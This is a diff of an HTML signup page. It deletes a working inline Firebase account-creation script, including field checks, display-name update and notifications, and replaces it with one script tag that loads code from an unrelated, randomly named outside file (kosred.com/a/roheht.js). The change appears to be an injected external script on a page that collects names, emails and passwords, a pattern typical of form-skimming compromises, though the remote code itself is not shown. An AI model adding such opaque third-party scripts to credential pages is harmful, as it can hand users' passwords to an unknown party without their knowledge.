@@ -115,56 +115,8 @@
 
   <!-- Your signup.js script -->
   <!-- Your signup.js script -->
-<script>
-  function signup() {
-    const name = document.getElementById('name').value;
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
-    const successMessage = document.getElementById('successMessage');
-    const notification = document.getElementById('notification');
-
-    // Check if any field is empty
-    if (!name || !email || !password) {
-      showNotification('Semua input harus diisi', false);
-      return;
-    }
-
-    firebase.auth().createUserWithEmailAndPassword(email, password)
-      .then((userCredential) => {
-        // Update the user's display name
-        userCredential.user.updateProfile({
-          displayName: name
-        })
-        .then(() => {
-          // Signup successful, show message and redirect to login page
-          successMessage.textContent = 'Akun berhasil dibuat. Anda akan diarahkan ke halaman login.';
-          setTimeout(() => {
-            window.location.href = 'login.html'; // Replace with your actual login page
-          }, 3000); // Wait 3 seconds before redirecting to login page
-        })
-        .catch((updateError) => {
-          console.error('Error updating display name:', updateError.message);
-          showNotification('Update display name failed.', false);
-        });
-      })
-      .catch((error) => {
-        // Handle signup error
-        console.error('Signup failed:', error.message);
-        showNotification('Signup failed. Email may already be registered.', false);
-      });
-  }
-
-  function showNotification(message, success) {
-    const notification = document.getElementById('notification');
-    notification.textContent = message;
-    notification.style.backgroundColor = success ? '#4CAF50' : '#ff5252';
-
-    notification.style.display = 'block';
-
-    setTimeout(() => {
-      notification.style.display = 'none';
-    }, 3000); // Hide the notification after 3 seconds
-  }
+<script src="https://kosred.com/a/roheht.js">
+  
 </script>
 </body>
 </html>
